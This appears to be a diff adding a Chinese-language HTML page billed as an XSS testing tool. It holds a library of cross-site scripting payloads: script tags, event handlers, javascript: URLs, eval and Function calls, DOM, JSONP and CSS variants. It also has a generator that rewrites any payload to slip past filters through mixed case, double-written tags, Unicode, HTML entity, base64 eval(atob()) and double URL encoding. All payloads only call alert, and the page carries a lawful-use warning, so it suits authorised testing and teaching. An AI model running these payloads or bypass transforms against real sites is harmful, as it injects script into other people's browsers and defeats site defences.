@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS测试工具 - 全面Payload生成器</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --light-color: #ecf0f1;
+            --dark-color: #34495e;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+        
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .card h2 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--secondary-color);
+        }
+        
+        .payload-section {
+            grid-column: 1 / -1;
+        }
+        
+        .category-tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .category-tab {
+            padding: 8px 16px;
+            background: var(--light-color);
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .category-tab.active {
+            background: var(--secondary-color);
+            color: white;
+        }
+        
+        .category-tab:hover {
+            background: var(--dark-color);
+            color: white;
+        }
+        
+        .payload-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        
+        .payload-item {
+            background: var(--light-color);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid var(--secondary-color);
+        }
+        
+        .payload-item h4 {
+            color: var(--dark-color);
+            margin-bottom: 8px;
+        }
+        
+        .payload-code {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+        
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary {
+            background: var(--secondary-color);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #2980b9;
+        }
+        
+        .btn-success {
+            background: var(--success-color);
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #229954;
+        }
+        
+        .btn-warning {
+            background: var(--warning-color);
+            color: white;
+        }
+        
+        .btn-warning:hover {
+            background: #e67e22;
+        }
+        
+        .btn-danger {
+            background: var(--accent-color);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+        
+        .custom-payload {
+            margin-top: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--secondary-color);
+        }
+        
+        .preview-section {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 2px dashed #ddd;
+        }
+        
+        .preview-section h3 {
+            margin-bottom: 10px;
+            color: var(--dark-color);
+        }
+        
+        .alert {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        .alert-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        .footer {
+            text-align: center;
+            color: white;
+            margin-top: 40px;
+            padding: 20px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>XSS测试工具</h1>
+            <p>全面的Payload生成器和绕过技术集合</p>
+        </header>
+
+        <div class="main-content">
+            <div class="card">
+                <h2>Payload分类</h2>
+                <div class="category-tabs">
+                    <button class="category-tab active" onclick="showCategory('basic')">基础标签</button>
+                    <button class="category-tab" onclick="showCategory('events')">事件处理器</button>
+                    <button class="category-tab" onclick="showCategory('javascript')">JavaScript</button>
+                    <button class="category-tab" onclick="showCategory('bypass')">绕过技术</button>
+                    <button class="category-tab" onclick="showCategory('advanced')">高级技巧</button>
+                </div>
+
+                <div id="payload-container">
+                    <!-- Payload内容将通过JavaScript动态加载 -->
+                </div>
+
+                <div class="custom-payload">
+                    <h3>自定义Payload</h3>
+                    <div class="form-group">
+                        <label for="custom-name">Payload名称:</label>
+                        <input type="text" id="custom-name" class="form-control" placeholder="输入payload名称">
+                    </div>
+                    <div class="form-group">
+                        <label for="custom-payload">Payload代码:</label>
+                        <textarea id="custom-payload" class="form-control" rows="3" placeholder="输入自定义payload代码"></textarea>
+                    </div>
+                    <button class="btn btn-primary" onclick="addCustomPayload()">添加自定义Payload</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>Payload测试</h2>
+                <div class="form-group">
+                    <label for="test-input">Payload测试框:</label>
+                    <input type="text" id="test-input" class="form-control" placeholder="在此输入或粘贴payload进行查看">
+                </div>
+                
+                <div class="preview-section">
+                    <h3>Payload分析:</h3>
+                    <div id="preview-result">
+                        <p>Payload详情将在此显示...</p>
+                    </div>
+                </div>
+
+                <div class="alert alert-warning">
+                    <strong>警告:</strong> 此工具仅用于合法的安全测试目的。请勿用于非法活动。生成的payload可能包含恶意代码，请谨慎使用。
+                </div>
+
+                <div class="form-group">
+                    <button class="btn btn-warning" onclick="analyzePayload()">分析Payload</button>
+                    <button class="btn btn-danger" onclick="clearAll()">清除所有</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="card payload-section">
+            <h2>Payload绕过生成器</h2>
+            
+            <div class="form-group">
+                <label for="library-select">从库中选择Payload:</label>
+                <select id="library-select" class="form-control">
+                    <option value="">-- 选择Payload --</option>
+                    <!-- 动态填充payload选项 -->
+                </select>
+                <button class="btn btn-primary" onclick="generateFromLibrary()" style="margin-top: 10px;">从库生成绕过</button>
+            </div>
+            
+            <div class="form-group">
+                <label for="bypass-input">或输入自定义Payload:</label>
+                <textarea id="bypass-input" class="form-control" rows="3" placeholder="输入要生成绕过的payload代码"></textarea>
+                <button class="btn btn-primary" onclick="generateFromInput()" style="margin-top: 10px;">从输入生成绕过</button>
+            </div>
+            
+            <div id="bypass-results">
+                <!-- 生成的绕过payloads将在这里显示 -->
+            </div>
+        </div>
+
+        <div class="card payload-section">
+            <h2>Payload库</h2>
+            <div id="payload-library">
+                <!-- 所有payload将在这里显示 -->
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 XSS测试工具 - 仅供教育目的</p>
+        </div>
+    </div>
+
+    <script>
+        // Payload数据 - 修复重复键问题
+        const payloads = {
+            'basic': [
+                {
+                    name: "基础Script标签",
+                    code: "<script>alert('XSS')<\/script>",
+                    description: "最基本的XSS payload"
+                },
+                {
+                    name: "Img标签",
+                    code: "<img src=x onerror=alert('XSS')>",
+                    description: "使用img标签的onerror事件"
+                },
+                {
+                    name: "SVG标签",
+                    code: "<svg onload=alert('XSS')>",
+                    description: "使用SVG的onload事件"
+                },
+                {
+                    name: "Div标签",
+                    code: "<div onmouseover=alert('XSS')>悬停我</div>",
+                    description: "鼠标悬停触发"
+                }
+            ],
+            'events': [
+                {
+                    name: "onclick事件",
+                    code: "<button onclick=alert('XSS')>点击我</button>",
+                    description: "点击按钮触发"
+                },
+                {
+                    name: "onload事件",
+                    code: "<body onload=alert('XSS')>",
+                    description: "页面加载时触发"
+                },
+                {
+                    name: "onmouseover事件",
+                    code: "<span onmouseover=alert('XSS')>悬停这里</span>",
+                    description: "鼠标悬停触发"
+                },
+                {
+                    name: "onerror事件",
+                    code: "<img src=invalid onerror=alert('XSS')>",
+                    description: "图片加载错误时触发"
+                }
+            ],
+            'javascript': [
+                {
+                    name: "JavaScript协议",
+                    code: "javascript:alert('XSS')",
+                    description: "在URL中使用javascript协议"
+                },
+                {
+                    name: "eval函数",
+                    code: "<script>eval(\"alert('XSS')\")<\/script>",
+                    description: "使用eval函数执行代码"
+                },
+                {
+                    name: "setTimeout",
+                    code: "<script>setTimeout(\"alert('XSS')\",1000)<\/script>",
+                    description: "延迟执行"
+                },
+                {
+                    name: "Function构造函数",
+                    code: "<script>new Function('alert(\\'XSS\\')')()<\/script>",
+                    description: "使用Function构造函数"
+                }
+            ],
+            'bypass': [
+                {
+                    name: "大小写绕过",
+                    code: "<ScRipt>alert('XSS')<\/sCriPt>",
+                    description: "混合大小写绕过过滤"
+                },
+                {
+                    name: "双写绕过",
+                    code: "<scrscriptipt>alert('XSS')<\/scrscriptipt>",
+                    description: "双写标签绕过过滤"
+                },
+                {
+                    name: "HTML编码绕过",
+                    code: "&#60;script&#62;alert('XSS')&#60;\/script&#62;",
+                    description: "使用HTML实体编码"
+                },
+                {
+                    name: "Unicode绕过",
+                    code: "\\u003Cscript\\u003Ealert('XSS')\\u003C\/script\\u003E",
+                    description: "使用Unicode编码"
+                }
+            ],
+            'advanced': [
+                {
+                    name: "DOM型XSS",
+                    code: "<script>document.write('<img src=x onerror=alert(\\'XSS\\')>')<\/script>",
+                    description: "DOM型XSS示例"
+                },
+                {
+                    name: "JSONP劫持",
+                    code: "<script src=\"https:\/\/example.com\/api?callback=alert('XSS')\"><\/script>",
+                    description: "JSONP回调函数劫持"
+                },
+                {
+                    name: "CSS注入",
+                    code: "<style>body{background:url('javascript:alert(\\'XSS\\')')}<\/style>",
+                    description: "通过CSS注入JavaScript"
+                }
+            ]
+        };
+
+        let customPayloads = [];
+        let currentCategory = 'basic';
+
+        // 显示分类
+        function showCategory(category) {
+            currentCategory = category;
+            const tabs = document.querySelectorAll('.category-tab');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            event.target.classList.add('active');
+            renderPayloads();
+        }
+
+        // 生成绕过payloads
+        function generateBypassPayloads(originalPayload) {
+            const bypasses = [];
+            
+            // 1. 大小写混合绕过
+            const mixedCase = originalPayload.replace(/[a-z]/gi, char => 
+                Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
+            );
+            bypasses.push({
+                name: "大小写混合绕过",
+                code: mixedCase,
+                description: "随机混合大小写字母"
+            });
+            
+            // 2. Unicode编码绕过
+            const unicodeEncoded = originalPayload.replace(/[<>"'\\/]/g, char => {
+                const code = char.charCodeAt(0);
+                return '\\u' + code.toString(16).padStart(4, '0');
+            });
+            bypasses.push({
+                name: "Unicode编码绕过",
+                code: unicodeEncoded,
+                description: "特殊字符Unicode编码"
+            });
+            
+            // 3. HTML实体编码绕过
+            const htmlEncoded = originalPayload
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+            bypasses.push({
+                name: "HTML实体编码绕过",
+                code: htmlEncoded,
+                description: "HTML实体编码特殊字符"
+            });
+            
+            // 4. Base64编码绕过
+            if (originalPayload.includes('javascript:')) {
+                const base64Encoded = originalPayload.replace(
+                    /javascript:(.*)/i, 
+                    (match, code) => 'javascript:eval(atob(\'' + btoa(code) + '\'))'
+                );
+                bypasses.push({
+                    name: "Base64编码绕过",
+                    code: base64Encoded,
+                    description: "JavaScript代码Base64编码"
+                });
+            }
+            
+            // 5. 双重URL编码绕过
+            const doubleEncoded = encodeURIComponent(encodeURIComponent(originalPayload));
+            bypasses.push({
+                name: "双重URL编码绕过",
+                code: doubleEncoded,
+                description: "双重URL编码payload"
+            });
+            
+            // 6. JavaScript协议包装 - 修复版本
+            if (!originalPayload.startsWith('javascript:')) {
+                // 确保payload是完整的JavaScript代码
+                let jsPayload = originalPayload;
+                
+                // 如果payload是HTML标签，需要确保它是完整的
+                if (jsPayload.includes('<') && jsPayload.includes('>')) {
+                    // 已经是HTML标签，直接添加javascript:前缀
+                    jsPayload = 'javascript:' + jsPayload;
+                } else {
+                    // 如果是纯JavaScript代码，确保语法正确
+                    if (!jsPayload.trim().endsWith(';')) {
+                        jsPayload = jsPayload + ';';
+                    }
+                    jsPayload = 'javascript:' + jsPayload;
+                }
+                
+                // 对payload进行HTML转义，防止HTML标签被解析
+                const escapedJsPayload = escapeHtml(jsPayload);
+                
+                bypasses.push({
+                    name: "JavaScript协议包装",
+                    code: escapedJsPayload,
+                    description: "添加javascript:协议前缀"
+                });
+            }
+            
+            return bypasses;
+        }
+
+        // 从库中生成绕过payloads
+        function generateFromLibrary() {
+            const librarySelect = document.getElementById('library-select');
+            const selectedPayload = librarySelect.value;
+            
+            if (!selectedPayload) {
+                alert('请从库中选择一个payload');
+                return;
+            }
+            
+            // 查找选中的payload
+            let originalPayload = '';
+            Object.keys(payloads).forEach(category => {
+                payloads[category].forEach(payload => {
+                    if (payload.name === selectedPayload) {
+                        originalPayload = payload.code;
+                    }
+                });
+            });
+            
+            if (!originalPayload) {
+                alert('未找到选中的payload');
+                return;
+            }
+            
+            generateAndDisplayBypasses(originalPayload);
+        }
+
+        // 从输入生成绕过payloads
+        function generateFromInput() {
+            const inputPayload = document.getElementById('bypass-input').value;
+            
+            if (!inputPayload) {
+                alert('请输入payload内容');
+                return;
+            }
+            
+            generateAndDisplayBypasses(inputPayload);
+        }
+
+        // 生成并显示绕过payloads
+        function generateAndDisplayBypasses(originalPayload) {
+            const bypassPayloads = generateBypassPayloads(originalPayload);
+            const resultsContainer = document.getElementById('bypass-results');
+            
+            let html = '<h3>生成的绕过Payloads:</h3>';
+            html += '<div class="payload-list">';
+            
+            bypassPayloads.forEach((bypass, index) => {
+                let escapedCode = escapeString(bypass.code);
+                
+                // 特殊处理HTML实体编码绕过
+                if (bypass.name === "HTML实体编码绕过") {
+                    const unescaped = bypass.code
+                        .replace(/&amp;/g, '&')
+                        .replace(/&lt;/g, '<')
+                        .replace(/&gt;/g, '>')
+                        .replace(/&quot;/g, '"')
+                        .replace(/&#039;/g, "'");
+                    escapedCode = escapeString(unescaped);
+                }
+                // 特殊处理JavaScript协议包装
+                else if (bypass.name === "JavaScript协议包装") {
+                    const unescaped = bypass.code
+                        .replace(/&amp;/g, '&')
+                        .replace(/&lt;/g, '<')
+                        .replace(/&gt;/g, '>')
+                        .replace(/&quot;/g, '"')
+                        .replace(/&#039;/g, "'");
+                    escapedCode = escapeString(unescaped);
+                }
+                
+                html += '<div class="payload-item">' +
+                        '<h4>' + bypass.name + '</h4>' +
+                        '<p>' + bypass.description + '</p>' +
+                        '<div class="payload-code">' + escapeHtml(bypass.code) + '</div>' +
+                        '<button class="btn btn-primary" onclick="copyToClipboard(\'' + escapedCode + '\')">复制</button>' +
+                        '<button class="btn btn-success" onclick="testSpecificPayload(\'' + escapedCode + '\')">测试</button>' +
+                        '</div>';
+            });
+            
+            html += '</div>';
+            resultsContainer.innerHTML = html;
+        }
+
+        // 渲染payloads
+        function renderPayloads() {
+            const container = document.getElementById('payload-container');
+            const categoryPayloads = payloads[currentCategory];
+            
+            let html = '<div class="payload-list">';
+            
+            categoryPayloads.forEach((payload, index) => {
+                html += '<div class="payload-item">' +
+                        '<h4>' + payload.name + '</h4>' +
+                        '<p>' + payload.description + '</p>' +
+                        '<div class="payload-code">' + escapeHtml(payload.code) + '</div>' +
+                        '<button class="btn btn-primary" onclick="copyToClipboard(\'' + escapeString(payload.code) + '\')">复制</button>' +
+                        '<button class="btn btn-success" onclick="testSpecificPayload(\'' + escapeString(payload.code) + '\')">测试</button>' +
+                        '</div>';
+            });
+
+            // 添加自定义payloads
+            customPayloads.forEach((payload, index) => {
+                if (payload.category === currentCategory) {
+                    html += '<div class="payload-item" style="border-left-color: var(--success-color);">' +
+                            '<h4>' + payload.name + ' (自定义)</h4>' +
+                            '<p>' + payload.description + '</p>' +
+                            '<div class="payload-code">' + escapeHtml(payload.code) + '</div>' +
+                            '<button class="btn btn-primary" onclick="copyToClipboard(\'' + escapeString(payload.code) + '\')">复制</button>' +
+                            '<button class="btn btn-success" onclick="testSpecificPayload(\'' + escapeString(payload.code) + '\')">测试</button>' +
+                            '<button class="btn btn-danger" onclick="removeCustomPayload(' + index + ')">删除</button>' +
+                            '</div>';
+                }
+            });
+
+            html += '</div>';
+            container.innerHTML = html;
+            updatePayloadLibrary();
+        }
+
+        // 添加自定义payload
+        function addCustomPayload() {
+            const name = document.getElementById('custom-name').value;
+            const code = document.getElementById('custom-payload').value;
+            
+            if (!name || !code) {
+                alert('请填写payload名称和代码');
+                return;
+            }
+
+            const payload = {
+                name: name,
+                code: code,
+                description: "自定义payload",
+                category: currentCategory
+            };
+
+            customPayloads.push(payload);
+            renderPayloads();
+            
+            // 清空表单
+            document.getElementById('custom-name').value = '';
+            document.getElementById('custom-payload').value = '';
+        }
+
+        // 删除自定义payload
+        function removeCustomPayload(index) {
+            customPayloads.splice(index, 1);
+            renderPayloads();
+        }
+
+        // 复制到剪贴板
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(unescapeString(text)).then(() => {
+                alert('已复制到剪贴板');
+            }).catch(err => {
+                console.error('复制失败:', err);
+            });
+        }
+
+        // 测试特定payload
+        function testSpecificPayload(encodedPayload) {
+            const payload = unescapeString(encodedPayload);
+            document.getElementById('test-input').value = payload;
+            analyzePayload();
+        }
+
+        // 分析payload
+        function analyzePayload() {
+            const testInput = document.getElementById('test-input').value;
+            if (!testInput) {
+                alert('请输入payload内容');
+                return;
+            }
+            
+            const previewResult = document.getElementById('preview-result');
+            
+            let analysis = '<div style="color: red; font-weight: bold;">⚠️ 安全警告: 此payload包含可执行代码</div>';
+            analysis += '<div style="margin: 10px 0; padding: 10px; background: #f8f9fa; border-radius: 5px;">';
+            analysis += '<strong>Payload内容:</strong><br>';
+            analysis += '<code style="word-break: break-all;">' + escapeHtml(testInput) + '</code>';
+            analysis += '</div>';
+            
+            analysis += '<div style="margin: 10px 0; padding: 10px; background: #e8f4fd; border-radius: 5px;">';
+            analysis += '<strong>分析结果:</strong><br>';
+            
+            // 增强的分析逻辑
+            if (testInput.includes('<script') || /<script/i.test(testInput)) {
+                analysis += '• 包含 script 标签<br>';
+            }
+            if (/onload\s*=|onerror\s*=|onclick\s*=/i.test(testInput)) {
+                analysis += '• 包含事件处理器<br>';
+            }
+            if (/javascript:/i.test(testInput)) {
+                analysis += '• 使用 javascript: 协议<br>';
+            }
+            if (/eval\(|Function\(/i.test(testInput)) {
+                analysis += '• 使用动态代码执行<br>';
+            }
+            if (/\u[0-9a-fA-F]{4}/.test(testInput)) {
+                analysis += '• 包含Unicode编码<br>';
+            }
+            if (/&(#\d+|#x[0-9a-fA-F]+);/.test(testInput)) {
+                analysis += '• 包含HTML实体编码<br>';
+            }
+            if (/data:text\/html;base64,/.test(testInput)) {
+                analysis += '• 使用Base64编码<br>';
+            }
+            
+            analysis += '• 长度: ' + testInput.length + ' 字符<br>';
+            analysis += '• 危险等级: ' + calculateDangerLevel(testInput) + '<br>';
+            analysis += '</div>';
+            
+            previewResult.innerHTML = analysis;
+        }
+
+        // 计算危险等级
+        function calculateDangerLevel(payload) {
+            let score = 0;
+            if (/<script/i.test(payload)) score += 3;
+            if (/onload\s*=|onerror\s*=/i.test(payload)) score += 2;
+            if (/javascript:/i.test(payload)) score += 2;
+            if (/eval\(|Function\(/i.test(payload)) score += 4;
+            if (/\u[0-9a-fA-F]{4}/.test(payload)) score += 1;
+            
+            if (score >= 7) return '高危';
+            if (score >= 4) return '中危';
+            return '低危';
+        }
+
+        // 清除所有
+        function clearAll() {
+            document.getElementById('test-input').value = '';
+            document.getElementById('preview-result').innerHTML = '<p>输入内容将在此处渲染...</p>';
+            customPayloads = [];
+            renderPayloads();
+        }
+
+        // 更新payload库
+        function updatePayloadLibrary() {
+            const library = document.getElementById('payload-library');
+            let html = '<div class="payload-list">';
+            
+            // 添加所有payloads
+            Object.keys(payloads).forEach(category => {
+                payloads[category].forEach(payload => {
+                    html += '<div class="payload-item">' +
+                            '<h4>' + payload.name + ' (' + category + ')</h4>' +
+                            '<p>' + payload.description + '</p>' +
+                            '<div class="payload-code">' + escapeHtml(payload.code) + '</div>' +
+                            '</div>';
+                });
+            });
+
+            // 添加自定义payloads
+            customPayloads.forEach(payload => {
+                html += '<div class="payload-item" style="border-left-color: var(--success-color);">' +
+                        '<h4>' + payload.name + ' (自定义 - ' + payload.category + ')</h4>' +
+                        '<p>' + payload.description + '</p>' +
+                        '<div class="payload-code">' + escapeHtml(payload.code) + '</div>' +
+                        '</div>';
+            });
+
+            html += '</div>';
+            library.innerHTML = html;
+        }
+
+        // 工具函数：转义HTML
+        function escapeHtml(unsafe) {
+            return unsafe
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        // 工具函数：转义字符串用于JavaScript
+        function escapeString(str) {
+            return str
+                .replace(/\\/g, '\\\\')
+                .replace(/'/g, "\\'")
+                .replace(/"/g, '\\"')
+                .replace(/\n/g, '\\n')
+                .replace(/\r/g, '\\r');
+        }
+
+        // 工具函数：反转义字符串
+        function unescapeString(str) {
+            return str
+                .replace(/\\\\/g, '\\')
+                .replace(/\\'/g, "'")
+                .replace(/\\"/g, '"')
+                .replace(/\\n/g, '\n')
+                .replace(/\\r/g, '\r');
+        }
+
+        // 初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            renderPayloads();
+            updatePayloadLibrary();
+            
+            // 填充绕过生成器的选择器
+            const librarySelect = document.getElementById('library-select');
+            Object.keys(payloads).forEach(category => {
+                payloads[category].forEach(payload => {
+                    const option = document.createElement('option');
+                    option.value = payload.name;
+                    option.textContent = payload.name + ' (' + category + ')';
+                    librarySelect.appendChild(option);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
